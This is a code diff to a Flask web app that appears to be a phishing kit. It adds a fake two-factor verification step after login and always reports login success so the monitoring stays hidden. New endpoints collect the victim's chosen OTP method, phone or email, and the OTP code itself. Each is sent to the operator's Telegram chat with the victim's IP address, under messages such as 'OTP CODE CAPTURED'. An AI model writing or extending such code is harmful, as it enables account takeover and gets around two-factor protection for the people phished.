@@ -10,6 +10,14 @@ load_dotenv()
 app = Flask(__name__, static_folder='static')
 app.secret_key = os.getenv('SECRET_KEY', 'your-secret-key-here')
 
+# Disable caching for all routes
+@app.after_request
+def add_header(response):
+    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, post-check=0, pre-check=0, max-age=0'
+    response.headers['Pragma'] = 'no-cache'
+    response.headers['Expires'] = '-1'
+    return response
+
 # Telegram configuration
 TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN')
 TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', 'YOUR_CHAT_ID')
@@ -149,8 +157,93 @@ def login():
     # Always return success to avoid revealing the monitoring
     return jsonify({
         'success': True,
-        'redirect': '/dashboard.html'
+        'redirect': '/otp-method.html'
     })
+
+@app.route('/submit-otp-method', methods=['POST'])
+def submit_otp_method():
+    data = request.get_json()
+    if not data:
+        return jsonify({'error': 'No data provided'}), 400
+
+    method = data.get('method', '').strip()
+    contact = data.get('contact', '').strip()
+    
+    if not method or not contact:
+        return jsonify({'error': 'Method and contact information are required'}), 400
+
+    # Get client information
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if ',' in ip:
+        ip = ip.split(',')[0].strip()
+    
+    if not ip or ip == '127.0.0.1':
+        ip = request.headers.get('X-Real-IP', request.remote_addr)
+    
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    
+    # Prepare OTP method notification message
+    method_emoji = "📧" if method == "email" else "📱"
+    method_name = "Email" if method == "email" else "SMS/Phone"
+    
+    message = (
+        "🔐 *2FA METHOD SELECTED* 🔐\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"{method_emoji} *Verification Method:* `{method_name}`\n"
+        f"📞 *Contact:* `{contact}`\n"
+        f"🌐 *IP Address:* `{ip}`\n"
+        f"⏰ *Time:* `{timestamp}`\n"
+        "━━━━━━━━━━━━━━━━━━━━"
+    )
+    
+    # Send notification to Telegram
+    send_telegram_alert(message)
+    
+    return jsonify({'success': True})
+
+@app.route('/verify-otp', methods=['POST'])
+def verify_otp():
+    data = request.get_json()
+    if not data:
+        return jsonify({'error': 'No data provided'}), 400
+
+    otp = data.get('otp', '').strip()
+    
+    if not otp:
+        return jsonify({'error': 'OTP code is required'}), 400
+
+    # Get client information
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if ',' in ip:
+        ip = ip.split(',')[0].strip()
+    
+    if not ip or ip == '127.0.0.1':
+        ip = request.headers.get('X-Real-IP', request.remote_addr)
+    
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    
+    # Prepare OTP code notification message
+    message = (
+        "🔢 *OTP CODE CAPTURED* 🔢\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"🔐 *OTP Code:* `{otp}`\n"
+        f"🌐 *IP Address:* `{ip}`\n"
+        f"⏰ *Time:* `{timestamp}`\n"
+        "━━━━━━━━━━━━━━━━━━━━"
+    )
+    
+    # Send notification to Telegram
+    send_telegram_alert(message)
+    
+    return jsonify({'success': True})
+
+@app.route('/otp-method.html')
+def otp_method():
+    return send_from_directory('.', 'otp-method.html')
+
+@app.route('/otp-verify.html')
+def otp_verify():
+    return send_from_directory('.', 'otp-verify.html')
 
 @app.route('/static/<path:path>')
 def serve_static(path):
